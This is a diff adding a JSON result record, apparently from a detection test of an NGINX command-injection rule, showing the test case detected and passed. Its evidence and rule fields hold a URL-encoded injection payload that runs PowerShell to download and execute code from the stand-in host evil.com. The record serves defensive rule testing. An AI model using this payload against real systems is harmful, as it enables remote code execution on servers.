@@ -1,0 +1,17 @@
+{
+  "pattern_id": "CMDI_PS_001",
+  "test_id": "CMDI_PS_001-1772266294744-i3uo3e",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 48000,
+  "evidence": "08:11:34.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772266294744-i3uo3e pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1",
+  "rule_name": "[NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772266294744-i3uo3e pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1",
+  "expected_rule": "[NGINX CMDi] Advanced command injection attempt",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772266294744-i3uo3e pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1",
+  "sent_at": 1772266342000,
+  "detected_at": 1772266294000,
+  "status": "passed"
+}
